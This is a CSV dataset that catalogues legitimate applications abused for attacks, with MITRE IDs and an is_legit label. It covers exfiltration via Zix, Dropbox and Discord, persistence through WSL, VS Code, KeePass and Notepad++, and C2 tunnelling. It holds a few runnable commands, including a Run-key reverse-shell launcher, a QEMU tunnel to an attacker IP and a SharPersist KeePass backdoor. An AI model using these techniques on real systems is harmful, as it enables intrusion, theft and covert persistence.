"Name","Description","Author","Created","Usage","Usage_Steps","Usage_Description","Usage_Usecase","Usage_Category","Usage_Privileges","Usage_Limitations","Usage_MitreID","Resources","Resources_Link","Acknowledgement","Acknowledgement_Person","Acknowledgement_Handle","is_legit"
"Zix Secure Messaging","Enterprise tool to compose, receive, view, reply to, and forward encrypted messages over the internet.","John Jackson","2023-01-09","","[''Attempt to locate the zix secure messaging portal for the organization and check to see if you have the ability to register an account. Register an account with a custom email that looks like it could actually belong to an employee. Zip any files you want to exfiltrate from the workstation. Compose a new message, and address it to an employee that doesnt actually exist in the system. You can now retrieve the files on a different device by logging in and viewing the sent mail tab.''-|-''Register a zix secure messaging account for the company. Upload a zip-encrypted archive with your payload in it. Compose a new message and send it to an employee that doesnt exist. Login from the victim host machine, download, unzip, and execute the payload.''-|-''Register a zix secure messaging account using multiple employee email addresses. Save all of the emails and passwords registered. If an employee clicks the approve button, youll now have their newly registered account to use for whitelisted phishing.'']","[''Steps to exfiltrate data using day-to-day enterprise tooling''-|-''Steps to setup an account and download your malware by a whitelisted solution.''-|-''Steps to attempt phishing with tools recognized/allowed by the company'']","[''Exfiltrating data in heavily monitored environments''-|-''Leveraging external tooling for proxy inspection bypass''-|-''Whitelisted phishing since Zix will probably be allowed if the company uses it'']","[''Data Exfiltration''-|-''Download''-|-''Phishing'']","[''None''-|-''None''-|-''User interaction/User'']","[''Need to be able to register an account or gain access to one. Can only exfiltrate a specified amount of data per message.''-|-''Need to be able to register an account or gain access to one. Can only upload a specified archive size per message.''-|-''An employee must click the account approval button. In addition, organizations can require an account creation code instead of an approval button.'']","[''T1567''-|-''T1105''-|-''T1566.003'']","","[''https://johnjhacking.com/blog/zix-exfiltration/''-|-''https://johnjhacking.com/blog/zix-spearphishing/'']","","John Jackson","@johnjhacking","false"
"Dropbox","File hosting service offering cloud storage and file synchronization","John Jackson","2023-01-10","","[''Create a free dropbox account. Upload files that you want to exfiltrate.''-|-''Create a free dropbox account. Upload a password protected archive. Access Dropbox from the victim host and download/extract the archive.'']","[''Steps to setup the exfiltration stream''-|-''Steps to download malware to the victim's host'']","[''Exfiltrating data in a pinch''-|-''Possibly whitelisted file downloading, depending on the organization.'']","[''Data Exfiltration''-|-''Download'']","[''None''-|-''None'']","[''Its not uncommon to see organizations block file sharing services by using traffic inspection through tools like Symantec Blue Coat.''-|-''The web application might be blocked.'']","[''T1567.002''-|-''T1102'']","","[''https://www.volexity.com/blog/2020/11/06/oceanlotus-extending-cyber-espionage-operations-through-fake-websites/''-|-''https://www.proofpoint.com/us/blog/threat-insight/good-bad-and-web-bug-ta416-increases-operational-tempo-against-european'']","","John Jackson","@johnjhacking","false"
"Discord","Discord is a VoIP and instant messaging social platform.","John Jackson","2023-01-14","","[''Create a new discord account. Login and click on the plus sign that says Add a Server on the left hand side. Create a new server, ensure that its public. In the general channel, click on the plus symbol on the message bar and click upload. Fire up Burpsuite and turn proxy intercept mode on, click on the attachment to intercept the request. Right click on the GET request in Burpsuite and click on copy link. Youll now have a direct link to the malware via discords CDN.''-|-''Follow the instructions per additional tooling provided in references. If you use DiscordGo, you'll have to compile your agent and configure your automation, in addition to making a server, setting up a bot, and configuring the tokens, permissions, and channels.''-|-''Generate a malicious dbghelp.dll, and use a tool like Invoke-DLLClone to copy the export address table from your target dll, to your malicious one. Place the newly created DLL into the ""C:\%LOCALAPPDATA%\Discord\app-*"" folder, where ""*"" is the correct version.'']","[''Steps to host malware''-|-''Steps to setup the C2 channel''-|-''Steps to sideload a malicious dll'']","[''Hosting malware with a limited budget''-|-''Implant management via non-standard C2 platform''-|-''Sideloading a Malicious DLL'']","[''Malware Hosting''-|-''C2 Channel''-|-''DLL Hijacking'']","[''None''-|-''None''-|-''User interaction/User'']","[''Discord isnt always allowed on Enterprise networks and your malware is at the mercy of Discord''-|-''Must rely on additional tooling''-|-''Must either have access to a user with Discord installed, or social engineer a user into downloading the DLL in the appropriate spot.'']","[''T1102''-|-''T1041''-|-''T1574.002'']","","[''https://usa.kaspersky.com/blog/malware-in-discord/25662/''-|-''https://unit42.paloaltonetworks.com/ukraine-targeted-outsteel-saintbot/''-|-''https://redteamer.tips/appdata-is-a-mistake-introducing-invoke-dllclone/''-|-''https://noghostonlyshell.com/posts/Abusing_Discord_for_LOLAPPS.pdf'']","","[''John Jackson''-|-''Kyle Hagerman'']","[''@johnjhacking''-|-''@kyle41111'']","false"
"Windows Subsystem for Linux (WSL)","WSL gives users and developers a seemless way to run Linux environments in the Windows operating system without virtual machines or dual booting.","Joe Helle","2023-01-29","","reg add “HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run” -v screendoor /t REG_SZ /d '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exewindowstyle hidden -c wsl --exec bash /home/themayor/temp.sh""'","Identify WSL or WSL2 functionality on a Windows 10 or 11 endpoint. This can be achieved by running 'where wsl' in a Command Prompt. Once identified, the command 'wsl' can be ran in either a Command Prompt or PowerShell terminal to load into the default Linux environment. Locate a suitable directory and generate a reverse shell that points to a listener or other C2 server. Backing out to the regular Command Prompt/PowerShell terminal, generate an Autorun registry edit. Start the reverse shell or C2 server listener. Run the command and wait for the system to reboot.","Establishing persistence on a Windows host","Persistence","User","System must have Windows Subsystem for Linux installed, and the current Windows user must be able to make edits to the Registry.","T1547.001","","https://medium.themayor.tech/windows-persistence-using-wsl2-8f87e319ea56","","Joe Helle","@joehelle","false"
"WinSCP","WinSCP is a free and open-source SSH File Transfer Protocol, File Transfer Protocol, WebDAV, Amazon S3, and secure copy protocol (SCP) client for Microsoft Windows.","Adam Brass and Martin Sohn Christensen","2023-01-29","","[''WinSCP ""Commands"" can contain persistence and are run upon hotkeys or interaction with the WinSCP interface. The type ""CustomCommands"" which are command line commands, multiple CustomCommands exists by default and are stored in ""HKCU:\SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\CustomCommands""''-|-''WinSCP ""Commands"" can contain persistence and are run upon hotkeys or interaction with the WinSCP interface. The type ""Extensions"" are PowerShell .ps1 files, multiple Extensions exist by default and are stored in ""%LocalAppData%\Programs\WinSCP\Extensions"" or ""%PROGRAMFILES(X86)%\WinSCP\Extensions"".''-|-''WinSCP ""External editor"" can contain persistence and are run upon editing a remote file. Persistence is created by setting a new external editor, setting a binary as the editor, and making the editor the preferred editor. The preferred editors is stored in ""HKCU\SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Interface\Editor\0"".'']","[''Steps to create a WinSCP ""CustomCommands"" persistence''-|-''Steps to create a WinSCP ""Extensions"" persitence''-|-''Steps to create a WinSCP ""Extensions"" persitence'']","[''Establishing persistence on a Windows host''-|-''Establishing persistence on a Windows host''-|-''Establishing persistence on a Windows host'']","[''Persistence''-|-''Persistence''-|-''Persistence'']","[''User or Administrator''-|-''User or Administrator''-|-''User'']","[''None''-|-''Requires write-access to the WinSCP directory, if installed for all users in Program Files it requires administrator privileges.''-|-''None'']","[''T1546''-|-''T1546''-|-''T1546'']","","https://twitter.com/martinsohndk/status/1649678130859130882","","Martin Sohn Christensen","@martinsohndk","false"
"Windows Terminal","The Windows Terminal is a terminal application developed for Windows 10 for users of command-line tools and shells like Command Prompt, PowerShell, and WSL.","Adam Brass and Martin Sohn Christensen","2023-01-29","","Locate the settings.json in ""%LocalAppData%\Packages\Microsoft.WindowsTerminal_*\LocalState\"". Add a custom profile with the payload in the ""commandLine"" parameter. Add the custom profile GUID to the ""defaultProfile"" value. Add the value ""startOnUserLogin"": true","Steps to create a Terminal profile for persistence","Establishing persistence on a Windows host","Persistence","User","None","T1546","","[''https://nasbench.medium.com/persistence-using-windows-terminal-profiles-5035d3fc86fe''-|-''https://infosecwriteups.com/stealthy-persistence-while-using-windows-terminal-ff6f4927563a'']","","[''Nasreddine Bencherchali''-|-''bob van der staak'']","[''@nas_bench''-|-''@securityBeserk'']","false"
"Microsoft Visual Studio Tools for Office (VSTO)","VSTO is functionality available in Visual Studio, which allows the user to craft a .NET Office Add-in to be shipped with an office document.","Abhijeet Kumar","2023-02-10","","[''Create a VSTO document (Word, Powerpoint, etc) embedded with a DLL file written in .NET and send it to any user. Once the user opens the documents and approves the ""Add-In"" installation, code will be executed.''-|-''Utilize a different VSTO payload ""Add-In"" and include the code for any of the persistence techniques. After successful installation, persistence will be achieved. For more information, see ""VSTO-POC"" in references.'']","[''Steps to exploitation using VSTO''-|-''Setting up persistence using VSTO'']","[''Initial Access to the system''-|-''Persistence'']","[''Phishing''-|-''Persistence'']","[''User interaction/User''-|-''User interaction/User'']","[''A user with valid privileges to approve Add-in installation.''-|-''A user with valid privileges to approve Add-In installation and persistence mechanisms. Additional security software installed on system can also detect and block the persistence mechanism.'']","[''T1204.002''-|-''T1137.006'']","","[''https://www.deepinstinct.com/blog/no-macro-no-worries-vsto-being-weaponized-by-threat-actors''-|-''https://medium.com/@airlockdigital/make-phishing-great-again-vsto-office-files-are-the-new-macro-nightmare-e09fcadef010''-|-''https://bohops.com/2018/01/31/vsto-the-payload-installer-that-probably-defeats-your-application-whitelisting-rules/''-|-''https://github.com/deepinstinct/VSTO-POC''-|-''https://learn.microsoft.com/en-us/visualstudio/vsto/getting-started-programming-vsto-add-ins?redirectedfrom=MSDN&view=vs-2022''-|-''https://github.com/deepinstinct/VSTO-POC'']","","Abhijeet Kumar","@SirH4ck3r","false"
"VS Code","Visual Studio Code, also commonly referred to as VS Code, is a source-code editor made by Microsoft with the Electron Framework, for Windows, Linux and macOS.","Adam Brass, Martin Sohn Christensen and Kirill Magaskin","2023-01-29","","[''Override/Create a workspace/settings.json config. Add a new terminal profile with the payload in the ""path"" and ""args"" parameters. Set the new terminal profile as default.''-|-''Create/Modify a task in a .code-workspace file, or a tasks.json file inside a .vscode folder. Add a new task with the payload in the 'command' or 'args' parameters. Add one of the possible triggers: 'runOption' parameter with value of 'folderOpen' or shortcut keys in the keybindings.json file.''-|-''Use '.\code.exe tunnel service install --no-sleep' from CLI and authorize yourself on source host with the 6 digit code or use 'Turn on Remote Tunnel Access' option in the VS Code GUI account menu and authorize yourself in the browser of target host. Then you'll get a link such as: https://vscode.dev/tunnel/<victim's hostname>/<directory>. Open this link in browser and authorize yourself on source host with the same Github/Microsoft account. Once you connect with this link, an SSH connection will be created over the tunnel in order to provide end-to-end encryption.'']","[''Steps to create a VS Code terminal persistence profile''-|-''Steps to create and enable a VS Code task for persitence''-|-''Steps to create and enable a VS Code Remote Tunnel as C2 service'']","[''Establishing persistence on a Windows host''-|-''Establishing persistence on a Windows host''-|-''Establishing C2 Channel on a Windows host'']","[''Persistence''-|-''Persistence''-|-''C2 Channel'']","[''User''-|-''User''-|-''User'']","[''None''-|-''None''-|-''You can have only 10 tunnels registered for one account.'']","[''T1546''-|-''T1546''-|-''T1572'']","","[''https://twitter.com/nas_bench/status/1618021415852335105''-|-''https://twitter.com/Cyb3rSn0rlax/status/1618201140008734721''-|-''https://www.linkedin.com/pulse/visual-studio-code-embedded-reverse-shell-how-block-create-thornton'']","","[''Nasreddine Bencherchali''-|-''HAMZA''-|-''Truvis Thornton'']","[''@nas_bench''-|-''@Cyb3rSn0rlax''-|-''@truvis.thornton'']","false"
"Sublime Text 3","A sophisticated text editor for code, markup, and prose.","rootd4ddy","2023-07-06","","Create a Python script plugin via the Sublime Plugin API. Create a ""user"" plugin folder in the plugins directory (e.g., ""%USERPROFILE%\AppData\Roaming\Sublime Text 3\Packages\User\"") and place the Python script in the directory.","Steps to establish persistence using Sublime Text plugins.","Establishing persistence on a Windows host.","Persistence","User","Requires access to the target machine with write permissions to Sublime Text's plugin folder.","T1546","","https://github.com/rootd4ddy/Sublime-persistence/","","rootd4ddy","@rootd4ddy","false"
"ShareX","ShareX is a free and open-source screenshot and screencast program for Microsoft Windows.","Adam Brass and Martin Sohn Christensen","2023-01-29","","Locate the ApplicationConfig.json file in Documents. Create/Modify an object in the ""ExternalPrograms"" array. Add the payload in the ""Path"" and ""Args"" key values. Set the ""IsActive"" key value to ""true"". In the ""AfterCaptureJob"" key, add the value ""SaveImageToFile, PerformActions"". Optionally set the ""HiddenWindow"" key value to ""true"".","Steps to create a ShareX after capture task for persistence","Establishing persistence on a Windows host","Persistence","User","The after capture task ""Save image to file"" must also be enabled.","T1546","","https://twitter.com/martinsohndk/status/1653445529219497987","","Martin Sohn Christensen","@martinsohndk","false"
"Remote Desktop Connection","Software to interact using the Protocol developed by Microsoft which provides a user with a graphical interface to connect to another system over a network connection.","John Jackson","2023-01-13","","Deploy a TCP/UDP tunnel or proxy agent such as Chisel or Ligolo. Once on the internal network, connect to the first machine via xfreerdp (Linux) or Remote Desktop Connection (Windows). Open up the Windows start menu and type in Remote Desktop Connection. Click on it and enter in the IP address of a host on the network. You can now pivot to another host with valid credentials. Alternatively, something headless such as SharpRDP can be used. If RDP isnt enabled but you have credentials for a domain admin, or a user with administrative access to the target system, you can possibly use crackmapexec to enable RDP.","Steps to connect to another host","Compromising other hosts with valid credentials","Lateral Movement","User","The user may not have access to the host, or RDP might be disabled. The user might not be in the right access group. Internal access to the network is needed.","T1021.001","","[''https://github.com/jpillora/chisel''-|-''https://github.com/sysdream/ligolo''-|-''https://github.com/0xthirteen/SharpRDP''-|-''https://cheatsheet.haax.fr/windows-systems/exploitation/rdp_exploitation/''-|-''https://posts.specterops.io/revisiting-remote-desktop-lateral-movement-8fb905cb46c3''-|-''https://www.crowdstrike.com/blog/carbon-spider-embraces-big-game-hunting-part-1'']","","John Jackson","@johnjhacking","false"
"QEMU","QEMU is a free and open-source emulator that uses dynamic binary translation to emulate a computer's processor","Kirill Magaskin","2025-02-18","","[''qemu-system-x86_64 -boot d -cdrom <AnyISOImage> -m 6048 -device e1000,netdev=n1, mac=<AnyMAC> -smp 2 -netdev socket,id=n1,listen=:<Port>''-|-''qemu-system-i386.exe -m 1M -netdev user,id=lan,restrict=off -netdev socket,id=sock,connect=<AttackerServerIP>:<AttackerServerPort> -netdev hubport,id=port-lan,hubid=0,netdev=lan -netdev hubport,id=port-sock,hubid=0,netdev=sock -nographic'']","[''Steps to create a QEMU listener on attacker's host on some PORT''-|-''Steps to create a QEMU socket network device on victim's host'']","[''Establishing C2 Channel''-|-''Establishing C2 Channel'']","[''C2 Channel''-|-''C2 Channel'']","[''User''-|-''User'']","[''None''-|-''None'']","[''T1572''-|-''T1572'']","","https://securelist.com/network-tunneling-with-qemu","","Grigory Sablin","@grixa","false"
"Notepad++","Notepad++ is a free source code editor and Notepad replacement that supports several languages.","Adam Brass and Martin Sohn Christensen","2023-01-29","","Compile code and generate a DLL plugin file. Create a custom plugin folder in the plugins directory, for example ""C:\Program Files\Notepad++\plugins\"" and place the DLL plugin file in the directory. The directory and DLL must have the same name.","Steps to create and enable a Notepad++ persistence plugin","Establishing persistence on a Windows host","Persistence","Administrator","Requires administrative privileges if Notepad++ is installed within %PROGRAMFILES% (default directory) or any other administrative write-protected directory.","T1546","","[''https://offensivedefence.co.uk/posts/notepad++/''-|-''https://pentestlab.blog/2022/02/14/persistence-notepad-plugins/'']","","[''Rasta Mouse''-|-''netbiosX'']","[''@_RastaMouse''-|-''@netbiosX'']","false"
"KeePass","KeePass is a free open source password manager.","Adam Brass and Martin Sohn Christensen","2023-02-28","","KeePass config file is backdoored by SharPersist by using 'SharPersist -t keepass -c ""C:\Windows\System32\cmd.exe"" -a ""/c calc.exe"" -f ""C:\Users\username\AppData\Roaming\KeePass\KeePass.config.xml"" -m add' where -t argument (persistence technique) keepass, -c argument (command to execute), -a argument to mask the previous command, along with the -f argument to create/ or modify the corresponding KeePass config file, ending with -m argument as method for (add, remove, check, list) add.","Uses KeePass database as persistence trigger / backdoors user''s KeePass configuration file with a KeePass trigger","Establishing persistence on a Windows host","Persistence","User","No limitations as you do not need admin access to establish this persistence mechanism","T1546","","[''https://github.com/mandiant/SharPersist''-|-''https://keepass.info/help/v2/triggers.html''-|-''https://medium.com/@two06/persistence-with-keepass-part-2-3e328b24e117'']","","Brett Hawkins","@h4wkst3r","false"
"Greenshot","Greenshot is a free and open-source screenshot program for Microsoft Windows.","Adam Brass and Martin Sohn Christensen","2023-01-29","","Any Greenshot plugin can contain persistence, the simplest being the ""External command plugin"" which uses command line; Modify the ""Greenshot.ini"" file in ""%AppData%\Greenshot\"", add an ""[ExternalCommand]"" configuration, add a new name to the ""Commands"" parameter, add the payload in the ""Commandline.<name>"" and ""Argument.<name>"", add the name to the ""Destinations"" parameter.  Alternatively, from GUI, open ""Preferences -> Plugins -> External command Plugin -> Configure"", add the payload in the ""Command"" and ""Argument"" parameters, open ""Preferences -> Destination"" and enable the new external command.","Steps to create a Greenshot plugin for persistence","Establishing persistence on a Windows host","Persistence","User","If using the ""External command plugin"" then the ""Open with external command plug-in"" must be installed (default). If creating/modifying a plugin then the Greenshot plugin folder (e.g. ""C:\Program Files\Greenshot\Plugins"") must be writeable.","T1546","","https://twitter.com/martinsohndk/status/1648763069852442642","","Martin Sohn Christensen","@martinsohndk","false"
